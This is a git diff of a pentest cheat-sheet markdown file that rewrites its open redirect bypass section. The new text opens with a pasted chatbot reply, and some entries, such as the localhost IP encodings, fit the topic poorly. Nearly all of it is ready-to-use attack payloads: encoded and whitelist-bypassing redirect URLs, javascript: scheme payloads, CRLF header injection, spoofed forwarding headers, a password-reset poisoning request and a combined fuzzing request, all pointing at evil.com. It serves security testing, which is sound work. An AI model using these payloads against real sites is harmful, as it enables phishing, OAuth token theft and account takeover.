@@ -1001,115 +1001,182 @@ https://target.com/login?next=https://evil.com
 ```
 
 ---
+Perfect 👍
+Below is **Open Redirection Bypass Techniques** written in the **same structured, numbered, payload-focused format** you shared (headers + payload blocks), suitable for **VAPT reports, GitHub notes, and bug bounty write-ups**.
 
-## 2️⃣ URL Encoding & Double Encoding
+---
 
-### Single Encoding
+# 🔴 Open Redirection – Complete Bypass Techniques (Pentest Format)
+
+---
+
+## 📌 1. Basic Open Redirect Payloads
 
 ```text
-https://target.com/?next=https%3A%2F%2Fevil.com
-```
-
-### Double Encoding
-
-```text
-https://target.com/?next=https%253A%252F%252Fevil.com
+?redirect=https://evil.com
+?url=https://evil.com
+?next=https://evil.com
+?return=https://evil.com
 ```
 
 ---
 
-## 3️⃣ Protocol Bypass Techniques
+## 📌 2. Protocol & Scheme Manipulation
 
-### Remove protocol
+### 2.1 Protocol-Relative URLs
 
 ```text
-//evil.com
+?next=//evil.com
+?redirect=///evil.com
 ```
 
-### Add protocol confusion
+### 2.2 Mixed / Confused Protocols
 
 ```text
-https://https://evil.com
-```
-
-### Mixed case
-
-```text
-HtTp://evil.com
+?next=https://https://evil.com
+?next=http://http://evil.com
 ```
 
 ---
 
-## 4️⃣ Subdomain & Whitelist Bypass
+## 📌 3. Domain Validation Bypass Payloads
 
-If app only allows `example.com`
+### 🔥 3.1 EndsWith / StartsWith Validation Bypass
 
 ```text
-https://example.com.evil.com
-https://evil.com@example.com
-https://example.com@evil.com
-https://example.com%00.evil.com
+https://target.com.evil.com
+https://target.com@evil.com
+https://evil.com?target.com
+https://target.com#evil.com
 ```
 
 ---
 
-## 5️⃣ Path-Based Redirect Bypass
+### 🔥 3.2 Prefix / Suffix Injection
 
 ```text
-https://target.com/redirect/https://evil.com
-https://target.com/redirect?url=/\evil.com
+trusted.com.evil.com
+trusted.com@evil.com
+evil.com/trusted.com
 ```
 
 ---
 
-## 6️⃣ Relative URL Abuse
+## 📌 4. Encoding-Based Bypass
+
+### 🔥 4.1 URL Encoding
+
+```text
+https%3A%2F%2Fevil.com
+```
+
+### 🔥 4.2 Double Encoding
+
+```text
+https%253A%252F%252Fevil.com
+```
+
+### 🔥 4.3 Mixed Encoding
+
+```text
+%68%74%74%70%73://evil.com
+```
+
+---
+
+## 📌 5. Relative Path & Slash Abuse
 
 ```text
 /\/evil.com
 \\evil.com
 ./evil.com
+../evil.com
 ```
 
 ---
 
-## 7️⃣ JavaScript-Based Redirects (DOM Open Redirect)
+## 📌 6. Fragment Identifier Bypass
 
-Look for:
+```text
+?next=https://target.com#https://evil.com
+```
+
+✔️ Works when fragment is parsed client-side (DOM redirects)
+
+---
+
+## 📌 7. JavaScript / DOM-Based Open Redirect
+
+### 🔥 7.1 JavaScript Scheme
+
+```text
+javascript:location.href='https://evil.com'
+javascript:window.location='https://evil.com'
+```
+
+### 🔥 7.2 DOM Sink Abuse
 
 ```js
-window.location
-document.location
 location.href
+document.location
+window.location
 location.assign()
-location.replace()
 ```
 
-### Payloads:
+Payload:
 
 ```text
-javascript:alert(1)
-javascript:location.href='https://evil.com'
+?next=javascript:location.href='https://evil.com'
 ```
 
 ---
 
-## 8️⃣ URL Redirection via XSS
+## 📌 8. Header-Based Open Redirect
 
-If input is reflected in JS context:
+### 🔥 8.1 Referer-Based Redirect
 
-```html
-<script>document.location.href="https://evil.com"</script>
+```http
+Referer: https://evil.com
 ```
 
-Test URL:
+### 🔥 8.2 Proxy Header Abuse
 
-```text
-https://target.com/search?q=<script>document.location.href="https://evil.com"</script>
+```http
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Server: evil.com
 ```
 
 ---
 
-## 9️⃣ CRLF Injection Redirect
+## 📌 9. HTTP Parameter Pollution (HPP)
+
+```text
+?next=https://target.com&next=https://evil.com
+```
+
+---
+
+## 📌 10. Whitelist Bypass Using Ports
+
+```text
+https://target.com:443@evil.com
+https://target.com:80@evil.com
+https://target.com:8080@evil.com
+```
+
+---
+
+## 📌 11. Whitespace / CRLF Injection
+
+### 🔥 11.1 Whitespace Injection
+
+```text
+https://evil.com%20
+https://evil.com%09
+```
+
+### 🔥 11.2 CRLF Redirect Injection
 
 ```text
 %0d%0aLocation:https://evil.com
@@ -1118,49 +1185,41 @@ https://target.com/search?q=<script>document.location.href="https://evil.com"</s
 Example:
 
 ```text
-https://target.com/?next=%0d%0aLocation:https://evil.com
+?next=%0d%0aLocation:https://evil.com
 ```
 
 ---
 
-## 🔟 Header-Based Open Redirect
+## 📌 12. Unicode & Special Character Bypass
 
-Check if headers are used:
-
-```http
-Referer: https://evil.com
-X-Forwarded-Host: evil.com
-Host: evil.com
-```
-
----
-
-## 1️⃣1️⃣ Fragment Identifier Abuse
+### 🔥 Unicode Slash / Dot
 
 ```text
-https://target.com/redirect#https://evil.com
-```
-
----
-
-## 1️⃣2️⃣ Unicode & Special Characters
-
-```text
-https://evil.com/%E2%80%8E
 https://evil.com/%EF%BC%8E
+https://evil.com/%E2%80%8E
 ```
 
----
-
-## 1️⃣3️⃣ HTTP Parameter Pollution (HPP)
+### 🔥 Punycode
 
 ```text
-?next=https://target.com&next=https://evil.com
+https://xn--evil-9sa.com
 ```
 
 ---
 
-## 1️⃣4️⃣ Base64 Encoded Redirect
+## 📌 13. IP-Based Redirect Bypass
+
+### 🔥 Decimal / Hex / Octal IP
+
+```text
+http://2130706433
+http://0x7f000001
+http://0177.0000.0001
+```
+
+---
+
+## 📌 14. Base64 Encoded Redirect
 
 ```text
 aHR0cHM6Ly9ldmlsLmNvbQ==
@@ -1169,54 +1228,34 @@ aHR0cHM6Ly9ldmlsLmNvbQ==
 Example:
 
 ```text
-https://target.com/?url=aHR0cHM6Ly9ldmlsLmNvbQ==
+?redirect=aHR0cHM6Ly9ldmlsLmNvbQ==
 ```
 
 ---
 
-## 1️⃣5️⃣ Open Redirect Chaining
+## 📌 15. OAuth / Password Reset Open Redirect (HIGH IMPACT)
 
-Combine with:
-
-* OAuth misconfig
-* Password reset
-* SSO login
-* Email verification links
-
-Example:
+### 🔥 OAuth redirect_uri
 
 ```text
-https://target.com/oauth?redirect_uri=https://evil.com
+redirect_uri=https://evil.com
+callback=https://evil.com
+```
+
+### 🔥 Password Reset Poisoning
+
+```http
+POST /forgot HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+Content-Type: application/json
+
+{"email":"victim@example.com"}
 ```
 
 ---
 
-## 1️⃣6️⃣ Bypass Using File Extensions
-
-```text
-https://evil.com/.json
-https://evil.com/.php
-```
-
----
-
-## 1️⃣7️⃣ URL Scheme Abuse
-
-```text
-data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSdodHRwczovL2V2aWwuY29tJzwvc2NyaXB0Pg==
-```
-
----
-
-## 1️⃣8️⃣ Mobile Deep-Link Redirects
-
-```text
-intent://evil.com#Intent;scheme=https;end
-```
-
----
-
-## 1️⃣9️⃣ Meta Refresh Redirect
+## 📌 16. Meta Refresh Redirect
 
 ```html
 <meta http-equiv="refresh" content="0;url=https://evil.com">
@@ -1224,31 +1263,26 @@ intent://evil.com#Intent;scheme=https;end
 
 ---
 
-## 2️⃣0️⃣ PostMessage-Based Redirect
-
-```js
-window.addEventListener("message", e => location.href = e.data)
-```
-
-Payload:
+## 📌 17. Mobile / Deep Link Redirect
 
 ```text
-https://evil.com
+intent://evil.com#Intent;scheme=https;end
 ```
 
 ---
 
-# 🧪 Tools for Testing
+## 📌 18. Combined Master Open Redirect Payload (Fuzzer)
 
-* **Burp Suite (Repeater + Intruder)**
-* **Param Miner**
-* **ffuf**
-* **Dalfox (DOM XSS)**
-* **OpenRedirect Scanner**
+```http
+GET /login?next=//evil.com HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+Referer: https://evil.com
+Origin: https://evil.com
+Forwarded: host=evil.com
+```
 
----
-
----
 # Directory Traversal
 
 * [Methodology](#methodology)
